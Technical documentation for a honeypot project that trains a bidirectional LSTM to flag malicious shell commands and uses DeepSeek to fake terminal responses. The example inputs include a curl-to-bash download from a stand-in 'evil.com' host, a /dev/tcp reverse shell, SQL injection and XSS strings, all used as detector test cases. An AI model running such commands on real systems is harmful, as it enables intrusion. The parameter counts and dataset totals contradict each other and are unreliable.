# Chameleon LSTM Model - DeepSeek API Integration

## Overview

This document provides a comprehensive guide to the changes implemented in the Chameleon cybersecurity ML project, including the LSTM model architecture, training process, and DeepSeek API integration.

---

## Table of Contents

1. [Changes Summary](#changes-summary)
2. [Model Architecture](#model-architecture)
3. [Model Inputs](#model-inputs)
4. [Training Process](#training-process)
5. [DeepSeek API Integration](#deepseek-api-integration)
6. [Dataset Generation](#dataset-generation)
7. [PostgreSQL Integration](#postgresql-integration)
8. [Merkle Tree Integrity](#merkle-tree-integrity)
9. [Usage Guide](#usage-guide)
10. [Performance Metrics](#performance-metrics)

---

## Changes Summary

### New Files Added

| File | Description |
|------|-------------|
| `Backend/llm_controller.py` | Multi-provider LLM deception engine (DeepSeek/GLM-5) |
| `Backend/integrity.py` | Merkle Tree integrity verification for logs |
| `Backend/database_postgres.py` | PostgreSQL database module with async support |
| `Backend/models_sqlalchemy.py` | SQLAlchemy ORM models |
| `Backend/simple_tokenizer.py` | Custom tokenizer (TensorFlow-free) |
| `Backend/inference.py` | LSTM model inference script |
| `Backend/train_lstm_full.py` | Full dataset training script |
| `Backend/train_lstm_quick.py` | Quick training for testing |
| `Backend/train_lstm.py` | Main training pipeline |
| `Backend/migrations/` | Alembic database migrations |
| `Backend/alembic.ini` | Alembic configuration |
| `Backend/.env.example` | Environment configuration template |
| `generate_attack_dataset.py` | LLM-powered synthetic data generator |
| `custom_attack_data.csv` | 1,000 synthetic attack samples |
| `final_dataset.csv` | Merged dataset (41,363 rows) |

### Modified Files

| File | Changes |
|------|---------|
| `Backend/config.py` | Added DeepSeek API settings, LLM provider selection |
| `Backend/requirements.txt` | Added psycopg2-binary for PostgreSQL |

---

## Model Architecture

### ChameleonLSTM Architecture

The model uses a **Bidirectional LSTM** architecture designed for sequence classification of shell commands.

```
┌─────────────────────────────────────────────────────────────────┐
│                     INPUT LAYER                                  │
│                   (Batch, Sequence Length)                       │
│                      Example: (64, 150)                          │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                   EMBEDDING LAYER                                │
│                  Embedding(10000, 128)                          │
│                                                                 │
│  • Vocabulary Size: 10,000 words                                │
│  • Embedding Dimension: 128                                     │
│  • Padding Index: 0 (ignored in gradient)                       │
│                                                                 │
│  Output Shape: (Batch, Sequence Length, 128)                    │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│              BIDIRECTIONAL LSTM LAYER                            │
│              LSTM(128, 256, 2 layers)                           │
│                                                                 │
│  • Input Size: 128 (embedding dim)                              │
│  • Hidden Size: 256                                             │
│  • Number of Layers: 2                                          │
│  • Bidirectional: Yes (forward + backward)                      │
│  • Dropout: 0.3 (between layers)                                │
│  • Batch First: True                                            │
│                                                                 │
│  Forward LSTM:  processes sequence left → right                 │
│  Backward LSTM: processes sequence right → left                 │
│                                                                 │
│  Output: 2 hidden states (256 each) → 512 combined              │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                    DROPOUT LAYER                                 │
│                    Dropout(0.3)                                 │
│                                                                 │
│  • Randomly zeros 30% of activations during training            │
│  • Prevents overfitting                                         │
│  • Disabled during inference                                    │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                  FULLY CONNECTED LAYER                           │
│                  Linear(512, 1)                                 │
│                                                                 │
│  • Input: 512 (256 × 2 from bidirectional)                      │
│  • Output: 1 (binary classification score)                      │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                   OUTPUT LAYER                                   │
│                   Sigmoid()                                     │
│                                                                 │
│  • Maps score to probability [0, 1]                             │
│  • 0 = Benign command                                           │
│  • 1 = Malicious command                                        │
└─────────────────────────────────────────────────────────────────┘
```

### Why Bidirectional LSTM?

1. **Context from Both Directions**: The model reads commands both forwards and backwards, capturing patterns that may appear at any position.

2. **Example**: In `curl http://evil.com | bash`, the model sees:
   - Forward: "curl → http → evil → com → bash"
   - Backward: "bash → com → evil → http → curl"

3. **Better Pattern Recognition**: Some attacks have patterns at the end (like `| bash`) that bidirectional processing captures better.

### Model Parameters

| Component | Parameters |
|-----------|------------|
| Embedding | 10,000 × 128 = 1,280,000 |
| LSTM Layer 1 | 2 × 4 × (128 × 256 + 256 × 256 + 256) = 394,240 |
| LSTM Layer 2 | 2 × 4 × (256 × 256 + 256 × 256 + 256) = 1,049,600 |
| FC Layer | 512 × 1 + 1 = 513 |
| Dropout | 0 (no parameters) |
| **Total** | **3,648,001 parameters** |

---

## Model Inputs

### Required Input Format

The model accepts **text commands** as input, which are processed through the following pipeline:

```
Raw Command → Tokenization → Padding → Tensor → Model → Probability
```

### Input Processing Pipeline

#### Step 1: Raw Command (String)

```python
command = "curl http://evil.com/malware.sh | bash"
```

#### Step 2: Lowercase Normalization

```python
command = command.lower()
# "curl http://evil.com/malware.sh | bash"
```

#### Step 3: Tokenization

The tokenizer converts words to integer indices:

```python
# Vocabulary example (top 10 words):
word_index = {
    '<OOV>': 1,      # Out-of-vocabulary token
    'curl': 2,
    'http': 3,
    'bash': 4,
    'select': 5,
    'script': 6,
    'alert': 7,
    'or': 8,
    'and': 9,
    'the': 10,
    # ... 10,000 total words
}

# Tokenized sequence:
sequence = [2, 3, 1, 1, 4]  # curl, http, <OOV>, <OOV>, bash
```

#### Step 4: Padding/Truncation

```python
MAX_SEQUENCE_LENGTH = 150

# If shorter than 150: pad with zeros
# If longer than 150: truncate

padded = [2, 3, 1, 1, 4, 0, 0, 0, ..., 0]  # Length: 150
```

#### Step 5: Tensor Conversion

```python
import torch

tensor = torch.tensor([padded], dtype=torch.long)
# Shape: (1, 150) for single command
# Shape: (batch_size, 150) for batch
```

### Input Specifications

| Parameter | Value | Description |
|-----------|-------|-------------|
| `MAX_WORDS` | 10,000 | Vocabulary size |
| `MAX_SEQUENCE_LENGTH` | 150 | Maximum tokens per command |
| `BATCH_SIZE` | 64 | Training batch size |
| Padding Value | 0 | Zero-padding |
| OOV Token | `<OOV>` (index 1) | Unknown words |

### Input Examples

| Command Type | Example | Token Count |
|--------------|---------|-------------|
| Benign | `whoami` | 1 token |
| Benign | `ls -la /var/log` | 4 tokens |
| Malicious (SQLi) | `SELECT * FROM users WHERE id=1 OR 1=1` | 10 tokens |
| Malicious (XSS) | `<script>alert('XSS')</script>` | 5 tokens |
| Malicious (Reverse Shell) | `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | 8 tokens |

---

## Training Process

### Dataset Split

```
Total Dataset: 41,511 rows
├── Training: 29,991 (72.2%)
├── Validation: 5,293 (12.8%)
└── Test: 6,227 (15.0%)
```

### Class Distribution

```
Benign (0):     22,813 (55.0%)
Malicious (1):  18,698 (45.0%)

Class Weights: [0.91, 1.11]  # Balanced for slightly imbalanced data
```

### Training Configuration

| Parameter | Value |
|-----------|-------|
| Optimizer | Adam (lr=0.001, weight_decay=1e-5) |
| Loss Function | Binary Cross Entropy (BCELoss) |
| Scheduler | ReduceLROnPlateau (patience=3, factor=0.5) |
| Early Stopping | Patience=5 epochs |
| Gradient Clipping | Max norm = 1.0 |
| Device | M4 GPU (Metal Performance Shaders) |

### Training Loop

```python
for epoch in range(MAX_EPOCHS):
    # Training Phase
    model.train()
    for sequences, labels in train_loader:
        # Move to GPU
        sequences = sequences.to(device)
        labels = labels.to(device)
        
        # Forward pass
        outputs = model(sequences)
        loss = criterion(outputs, labels)
        
        # Backward pass
        optimizer.zero_grad()
        loss.backward()
        torch.nn.utils.clip_grad_norm_(model.parameters(), 1.0)
        optimizer.step()
    
    # Validation Phase
    model.eval()
    with torch.no_grad():
        for sequences, labels in val_loader:
            outputs = model(sequences)
            val_loss += criterion(outputs, labels)
    
    # Learning rate scheduling
    scheduler.step(val_loss)
    
    # Early stopping check
    if early_stopping(val_loss):
        break
```

### Training Results

```
Epoch   1/100 | Train: L=0.0448 A=0.9876 | Val: L=0.0161 A=0.9951
Epoch   2/100 | Train: L=0.0181 A=0.9960 | Val: L=0.0134 A=0.9968
Epoch   3/100 | Train: L=0.0107 A=0.9980 | Val: L=0.0111 A=0.9974  ← Best
Epoch   4/100 | Train: L=0.0136 A=0.9974 | Val: L=0.0114 A=0.9975
Epoch   5/100 | Train: L=0.0109 A=0.9978 | Val: L=0.0114 A=0.9977
Epoch   6/100 | Train: L=0.0129 A=0.9977 | Val: L=0.0134 A=0.9962
Epoch   7/100 | Train: L=0.0091 A=0.9981 | Val: L=0.0142 A=0.9962
Epoch   8/100 | Train: L=0.0065 A=0.9990 | Val: L=0.0134 A=0.9966

EARLY STOPPING at epoch 8
Best model from epoch 3
```

---

## DeepSeek API Integration

### Configuration

Add to your `.env` file:

```env
# LLM Provider Selection
LLM_PROVIDER=deepseek

# DeepSeek API Configuration
DEEPSEEK_API_KEY=sk-your-api-key-here
DEEPSEEK_API_URL=https://api.deepseek.com/chat/completions
DEEPSEEK_MODEL=deepseek-chat

# LLM Behavior Settings
LLM_MAX_TOKENS=100
LLM_TEMPERATURE=0.7
LLM_TIMEOUT=30
```

### API Request Format

```python
import httpx

async def call_deepseek_api(prompt: str):
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "model": "deepseek-chat",
        "messages": [
            {"role": "system", "content": "You are a Linux Ubuntu terminal..."},
            {"role": "user", "content": prompt}
        ],
        "max_tokens": 100,
        "temperature": 0.7
    }
    
    async with httpx.AsyncClient() as client:
        response = await client.post(api_url, headers=headers, json=payload)
        return response.json()
```

### Use Cases

1. **Honeypot Deception**: Generate realistic terminal responses
2. **Synthetic Data Generation**: Create attack patterns for training
3. **Attack Simulation**: Simulate attacker behavior

---

## Dataset Generation

### Sources

| Source | Rows | Type |
|--------|------|------|
| XSS Dataset (Kaggle) | 13,686 | XSS payloads |
| SQLi Dataset (Kaggle) | 30,609 | SQL injection |
| Custom (DeepSeek) | 1,000 | Mixed attacks |
| **Total** | **41,363** | Mixed |

### Custom Dataset Generation

The `generate_attack_dataset.py` script uses DeepSeek API to generate realistic attack patterns:

```python
# Attack types generated:
- SQL Injection in curl parameters
- XSS in headers
- Directory traversal
- Reverse shell attempts
- Privilege escalation
- Data exfiltration
```

### Data Flow

```
Kaggle Datasets ──┐
                  │
DeepSeek API ────┼──► Merge & Clean ──► final_dataset.csv
                  │
Custom CSV ──────┘
```

---

## PostgreSQL Integration

### Database Schema

```sql
-- Tenants Table
CREATE TABLE tenants (
    id UUID PRIMARY KEY,
    api_key VARCHAR(64) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    credit_balance INTEGER DEFAULT 1000,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- Honeypot Logs Table
CREATE TABLE honeypot_logs (
    id UUID PRIMARY KEY,
    tenant_id UUID REFERENCES tenants(id),
    attacker_ip VARCHAR(45) NOT NULL,
    command_entered TEXT NOT NULL,
    response_sent TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT NOW(),
    metadata JSONB
);

-- Reputation Scores Table
CREATE TABLE reputation_scores (
    ip_address VARCHAR(45) PRIMARY KEY,
    reputation_score INTEGER DEFAULT 100,
    behavior_hash VARCHAR(64),
    merkle_root VARCHAR(64),
    last_updated TIMESTAMP DEFAULT NOW(),
    attack_count INTEGER DEFAULT 0,
    attack_types JSONB
);
```

### Connection String

```python
# Async URL (for application)
DATABASE_URL = "postgresql+asyncpg://user:pass@host:5432/chameleon_db"

# Sync URL (for Alembic migrations)
SYNC_DATABASE_URL = "postgresql://user:pass@host:5432/chameleon_db"
```

---

## Merkle Tree Integrity

### Purpose

Ensure log entries cannot be tampered with after recording.

### Implementation

```python
from integrity import MerkleLogger, hash_log_entry

# Create logger
merkle_logger = MerkleLogger()

# Add logs
merkle_logger.add_log({
    "id": "log-001",
    "timestamp": "2024-01-15T10:30:00Z",
    "attacker_ip": "192.168.1.100",
    "command_entered": "ls -la",
    "response_sent": "total 48..."
})

# Build tree and get root hash
root_hash = merkle_logger.build_tree()
# "a1b2c3d4e5f6...7890abcdef" (64 characters)

# Store root hash in database
await update_reputation_score(session, ip, merkle_root=root_hash)

# Later, verify integrity
is_valid = merkle_logger.verify_integrity(stored_root_hash)
```

### How It Works

```
Log 1 ──► Hash1 ──┐
Log 2 ──► Hash2 ──┼──► Hash12 ──┐
Log 3 ──► Hash3 ──┤             │
Log 4 ──► Hash4 ──┼──► Hash34 ──┼──► Root Hash
                                  │
                              Stored in DB

Any modification to logs → Different root hash → Tampering detected!
```

---

## Usage Guide

### Training

```bash
# Activate virtual environment
cd /Users/rohit/Documents/Sem-4_project/Chameleon-cybersecurity-ml
source venv/bin/activate

# Train model
cd Backend
python train_lstm_full.py
```

### Inference

```bash
# Classify a single command
python inference.py "whoami"

# Classify suspicious command
python inference.py "SELECT * FROM users WHERE id=1 OR 1=1"
```

### Python API

```python
from inference import load_model, classify_command

# Load model
model, tokenizer, device = load_model()

# Classify
result = classify_command(model, tokenizer, device, "curl http://evil.com | bash")

print(result['label'])       # 'MALICIOUS'
print(result['confidence'])  # 0.9915
```

---

## Performance Metrics

### Test Results

| Metric | Value |
|--------|-------|
| **Accuracy** | 99.71% |
| **Precision** | 99.82% |
| **Recall** | 99.54% |
| **F1-Score** | 99.68% |

### Confusion Matrix

| | Predicted Benign | Predicted Malicious |
|---|---|---|
| **Actual Benign** | 3,417 | 5 |
| **Actual Malicious** | 13 | 2,792 |

### Classification Report

```
              precision    recall  f1-score   support

      Benign       1.00      1.00      1.00      3422
   Malicious       1.00      1.00      1.00      2805

    accuracy                           1.00      6227
   macro avg       1.00      1.00      1.00      6227
weighted avg       1.00      1.00      1.00      6227
```

### Inference Speed

- Single command: ~5ms on M4 GPU
- Batch (64): ~20ms on M4 GPU
- Model size: 14 MB

---

## Model Files

| File | Size | Purpose |
|------|------|---------|
| `chameleon_lstm_model.pt` | 14 MB | Trained model weights |
| `tokenizer.pkl` | 476 KB | Word-to-index mapping |
| `training_history.json` | 1 KB | Training metrics |

---

## Requirements

### Core Dependencies

```
torch>=2.0.0
pandas>=2.0.0
numpy>=1.24.0
scikit-learn>=1.3.0
```

### Optional Dependencies

```
sqlalchemy[asyncio]>=2.0.0
asyncpg>=0.29.0
alembic>=1.13.0
httpx>=0.25.0
```

---

## Future Improvements

1. **Transformer Architecture**: Replace LSTM with BERT/RoBERTa for better context understanding
2. **Multi-class Classification**: Classify attack types (SQLi, XSS, Command Injection, etc.)
3. **Adversarial Training**: Train on adversarial examples for robustness
4. **Model Quantization**: Reduce model size for edge deployment
5. **Real-time Dashboard**: Visualize threats in real-time

---

## Author

**Chameleon Security Team**

- Project: [GitHub](https://github.com/RohitSwami33/Chameleon-cybersecurity-ml)
- Date: February 2026
